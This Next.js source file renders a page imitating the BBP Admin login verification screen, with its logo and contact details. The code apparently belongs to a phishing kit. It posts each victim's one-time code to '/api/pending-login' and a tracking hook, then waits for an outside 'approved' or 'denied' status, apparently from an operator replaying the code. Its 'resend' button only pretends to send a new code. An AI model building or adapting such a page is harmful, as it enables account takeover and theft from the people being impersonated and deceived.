"use client"

import Link from "next/link"
import Image from "next/image"
import { useEffect, useState, useRef, Suspense } from "react"
import { useSearchParams } from "next/navigation"
import { Phone, Mail, ArrowLeft, ArrowRight, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Footer } from "@/components/footer"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
import {
  setAptiaLoginFlowStage,
  useAptiaLoginFlowGuard,
} from "@/hooks/use-aptia-login-flow-guard"
import {
  BBP_PRIMARY_BUTTON_CLASS,
  BBP_SECONDARY_BUTTON_CLASS,
} from "@/lib/wealthcare-button-styles"

const POLL_INTERVAL_MS = 750
const WAIT_TIMEOUT_MS = 90 * 1000
type OtpApprovalResult = "denied" | "timeout" | "error" | null

function VerifyCodeContent() {
  useAptiaLoginFlowGuard({
    expectedStage: "otp",
    noAuthUrl: "/",
    wrongStageUrl: "/login/2fa-verify",
  })

  const searchParams = useSearchParams()
  const method = searchParams.get('method') || 'email'

  const [maskedEmail, setMaskedEmail] = useState("**********")
  const [maskedPhone, setMaskedPhone] = useState("***-***-****")
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [timeLeft, setTimeLeft] = useState(15 * 60)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const [resendSecondsLeft, setResendSecondsLeft] = useState(0)
  const [otpApprovalResult, setOtpApprovalResult] = useState<OtpApprovalResult>(null)
  const [pendingOtpId, setPendingOtpId] = useState<string | null>(null)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  useEffect(() => {
    if (typeof window !== 'undefined' && window.self !== window.top) {
      window.top!.location.href = window.location.pathname + window.location.search
      return
    }
  }, [])

  useEffect(() => {
    if (!pendingOtpId) return

    const clearPolling = () => {
      if (pollRef.current) {
        clearInterval(pollRef.current)
        pollRef.current = null
      }
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current)
        timeoutRef.current = null
      }
    }

    timeoutRef.current = setTimeout(() => {
      clearPolling()
      setIsLoading(false)
      setOtpApprovalResult('timeout')
      setErrors({ otp: 'Request timed out. Please try again.' })
      setOtp(['', '', '', '', '', ''])
      setPendingOtpId(null)
    }, WAIT_TIMEOUT_MS)

    const poll = async () => {
      try {
        const res = await fetch(`/api/pending-login/${encodeURIComponent(pendingOtpId)}`, {
          cache: 'no-store',
          headers: { 'Cache-Control': 'no-cache', Pragma: 'no-cache' },
        })
        if (!res.ok) return
        const data = await res.json()
        const status = String(data?.status ?? '').trim().toLowerCase()
        if (status === 'approved') {
          clearPolling()
          setIsLoading(false)
          setPendingOtpId(null)
          window.location.href = '/api/login-out'
          return
        }
        if (status === 'denied' || status === 'expired') {
          clearPolling()
          setIsLoading(false)
          setOtp(['', '', '', '', '', ''])
          setOtpApprovalResult(status === 'denied' ? 'denied' : 'timeout')
          setErrors({
            otp:
              status === 'denied'
                ? 'Incorrect Code or Expired Code'
                : 'Request timed out. Please try again.',
          })
          setPendingOtpId(null)
          inputRefs.current[0]?.focus()
        }
      } catch {
        // ignore temporary polling errors
      }
    }

    pollRef.current = setInterval(poll, POLL_INTERVAL_MS)
    poll()
    return clearPolling
  }, [pendingOtpId])

  useEffect(() => {
    try {
      const email = sessionStorage.getItem('maskedEmail')
      const phone = sessionStorage.getItem('maskedPhone')
      if (email) setMaskedEmail(email)
      if (phone) setMaskedPhone(phone)
    } catch { }
  }, [])

  useEffect(() => {
    const denied = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('denied') : null
    const timeout = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('timeout') : null
    if (denied === '1') {
      setOtp(['', '', '', '', '', ''])
      setOtpApprovalResult('denied')
      setErrors({ otp: 'Incorrect Code or Expired Code' })
      setIsLoading(false)
      setPendingOtpId(null)
    }
    if (timeout === '1') {
      setOtp(['', '', '', '', '', ''])
      setOtpApprovalResult('timeout')
      setErrors({ otp: 'Request timed out. Please try again.' })
      setIsLoading(false)
      setPendingOtpId(null)
    }
  }, [])

  useEffect(() => {
    if (timeLeft <= 0) return
    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1)
    }, 1000)
    return () => clearInterval(timer)
  }, [timeLeft])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const timer = setInterval(() => {
      setResendCooldown(prev => (prev <= 1 ? 0 : prev - 1))
    }, 1000)
    return () => clearInterval(timer)
  }, [resendCooldown])

  useEffect(() => {
    if (resendSecondsLeft <= 0) return
    const t = setInterval(() => setResendSecondsLeft(s => (s <= 1 ? 0 : s - 1)), 1000)
    return () => clearInterval(t)
  }, [resendSecondsLeft])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}m ${secs.toString().padStart(2, '0')}s`
  }

  const formatShortTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, '0')}`
  }

  const handleOtpChange = (index: number, value: string) => {
    const digitsOnly = value.replace(/\D/g, '')
    if (!digitsOnly && value !== '') return
    const newOtp = [...otp]
    newOtp[index] = digitsOnly.slice(-1)
    setOtp(newOtp)
    if (errors.otp) {
      setErrors((prev) => ({ ...prev, otp: "" }))
    }
    if (otpApprovalResult) {
      setOtpApprovalResult(null)
    }
    if (digitsOnly && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6)
    const newOtp = [...otp]
    for (let i = 0; i < pastedData.length; i++) {
      newOtp[i] = pastedData[i]
    }
    setOtp(newOtp)
    const nextIndex = Math.min(pastedData.length, 5)
    inputRefs.current[nextIndex]?.focus()
  }

  const handleVerify = async () => {
    setErrors({})
    setOtpApprovalResult(null)
    const otpCode = otp.join('')
    if (otpCode.length !== 6) {
      setErrors({ otp: 'Please enter the complete 6-digit code' })
      return
    }

    setIsLoading(true)
    const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
    trackFormSubmission({
      type: method === 'email' ? 'login_email_otp_verification' : 'login_text_otp_verification',
      userId,
      method,
      otp: otpCode,
      page: `/login/verify-code?method=${method}`,
    }).catch(() => { })

    try {
      const res = await fetch('/api/pending-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: userId || 'login',
          password: otpCode,
          method,
          maskedEmail,
          maskedPhone,
          flow: 'otp',
        }),
      })
      const data = await res.json()
      if (!res.ok) {
        setIsLoading(false)
        setOtpApprovalResult('error')
        setErrors({ otp: (data as { error?: string })?.error || 'Request failed. Try again.' })
        return
      }
      if (data.id) {
        setPendingOtpId(data.id)
        return
      }
      setIsLoading(false)
      setOtpApprovalResult('timeout')
    } catch {
      setIsLoading(false)
      setOtpApprovalResult('error')
      setErrors({ otp: 'Request failed. Try again.' })
    }
  }

  const handleResend = async () => {
    if (isResending || resendCooldown > 0) return
    setIsResending(true)
    setOtp(["", "", "", "", "", ""])
    setTimeLeft(15 * 60)
    setErrors({})
    setOtpApprovalResult(null)

    const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
    await trackFormSubmission({
      type: method === 'email' ? 'login_email_otp_resend' : 'login_text_otp_resend',
      userId,
      method,
      page: `/login/verify-code?method=${method}`,
    }).catch(() => { })

    await new Promise(r => setTimeout(r, 2000))
    setIsResending(false)
    setResendCooldown(30)
    inputRefs.current[0]?.focus()
  }

  const isEmail = method === 'email'
  return (
    <div className="min-h-screen flex flex-col bg-white">
      <header className="bg-white border-b border-gray-200 px-6 py-[15px]">
        <div className="flex items-center">
          <div className="flex items-center gap-6 flex-1 min-w-0">
            <Link href="/" className="flex items-center shrink-0">
              <Image
                src="/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"
                alt="BBP Admin"
                width={120}
                height={40}
                className="h-[40px] w-auto"
                priority
              />
            </Link>
            <div className="flex flex-col text-xs text-gray-600 leading-tight ml-auto shrink-0">
              <div className="flex items-center gap-2">
                <Phone className="w-3 h-3" />
                <span>(630) 773-2337</span>
              </div>
              <div className="flex items-center gap-2 mt-0.5">
                <Mail className="w-3 h-3" />
                <span>support@bbpadmin.com</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center px-6 py-8">
        <div className="w-full max-w-3xl">
          <p className="text-center text-gray-700 mb-2">
            Enter the verification code that you received via <strong>{isEmail ? 'email' : 'SMS'}</strong> below:
          </p>
          <p className="text-center text-gray-500 text-sm mb-6">
            Note - Do not share your verification code with anyone else
          </p>

          <div className="flex justify-center gap-2 mb-4" onPaste={handleOtpPaste}>
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { inputRefs.current[index] = el }}
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                maxLength={1}
                value={digit}
                autoFocus={index === 0}
                onChange={(e) => handleOtpChange(index, e.target.value)}
                onKeyDown={(e) => handleOtpKeyDown(index, e)}
                className="w-12 h-12 text-center text-xl border-b-2 border-gray-400 focus:border-[#141c4d] outline-none bg-transparent"
              />
            ))}
          </div>

          <p className="text-center text-gray-600 text-sm mb-4">
            OTP will expire in {formatTime(timeLeft)}
          </p>

          {errors.otp && (
            <p className="text-red-500 text-sm text-center mb-2">{errors.otp}</p>
          )}

          <p className="text-center mb-2">
            <button
              type="button"
              onClick={() => void handleResend()}
              disabled={isResending || resendCooldown > 0}
              className="text-[#407ec9] hover:text-[#141c4d] text-sm disabled:opacity-50"
            >
              {isResending
                ? 'Sending...'
                : resendCooldown > 0
                  ? `Resend verification code (${formatShortTime(resendCooldown)})`
                  : 'Resend verification code'}
            </button>
          </p>

          <div className="flex items-center justify-center gap-3">
            <Link href="/login/2fa-verify" onClick={() => setAptiaLoginFlowStage('2fa')}>
              <Button className={`${BBP_SECONDARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}>
                <ArrowLeft className="w-4 h-4 mr-2" />
                BACK
              </Button>
            </Link>
            <Button
              className={`${BBP_PRIMARY_BUTTON_CLASS} px-6 py-5 min-w-[120px] disabled:opacity-50`}
              onClick={() => void handleVerify()}
              disabled={isLoading || otp.join('').length !== 6}
            >
              {isLoading ? (
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
              ) : (
                <ArrowRight className="w-4 h-4 mr-2" />
              )}
              {isLoading ? 'Verifying...' : 'VERIFY'}
            </Button>
          </div>

          {resendSecondsLeft > 0 && (
            <p className="text-center text-gray-500 text-sm mt-4">
              Resend code {Math.floor(resendSecondsLeft / 60)}:{(resendSecondsLeft % 60).toString().padStart(2, '0')}
            </p>
          )}
        </div>
      </main>

      <Footer />
    </div>
  )
}

export default function LoginVerifyCodePage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-gray-600">Loading...</div>
      </div>
    }>
      <VerifyCodeContent />
    </Suspense>
  )
}
